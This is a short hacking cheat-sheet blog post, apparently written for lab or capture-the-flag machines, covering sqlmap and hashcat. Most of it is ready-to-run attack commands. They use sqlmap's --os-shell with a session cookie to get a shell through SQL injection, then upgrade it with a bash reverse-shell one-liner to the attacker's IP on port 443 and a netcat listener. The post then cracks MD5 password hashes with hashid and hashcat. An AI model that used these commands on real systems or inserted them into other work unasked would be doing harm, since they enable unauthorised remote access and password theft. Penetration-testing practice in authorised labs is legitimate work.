---
title: SQLMAP
published: true
author:
  name: Aissa Ben yahya
date: 2022-02-10 16:09:00 +0100
categories: [Hacking, Tools]
tags: [Hacking]
---

## SQL Map
---
SQLMAP is a tool to search for sql injection vulnerabilities.

### Get a shell with sqlmap

```bash
sqlmap -u 'http://10.129.171.190/dashboard.php?search=sa' --cookie="PHPSESSID=dnmjjjj6rias1o8pc3ob5rj7j9" --os-shell
```
If something goes wrong with your sqlmap tool after a successful usage, you can try and flush the session by adding `--flush-session --time-sec=20` argument

The command line above will grant you with a shell but it's not very stable. In order to make the shell stable we will use the following payload
```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```
but first you need to open a listener in another terminal on port 443 using `netcat`:
```bash
nc  -lvnp 443
```
To make the shell fully interactive I recommand you to check [Stable shell]({% post_url 2022-02-10-stableshell %}) 

## Hashcat
Hashcat is a tool used to crack the hashed passwords. But first before diving on how hashcat works it better to identify the hash type.
```bash
hashid 'hash_value_here'
```
Put the hash in file
```bash
echo 'hash_value' > file_name
```
Now to crack an MD5 hash type the following
```bash
hashcat -a 0 -m 0 file_name /the/path/to/wordlist
```

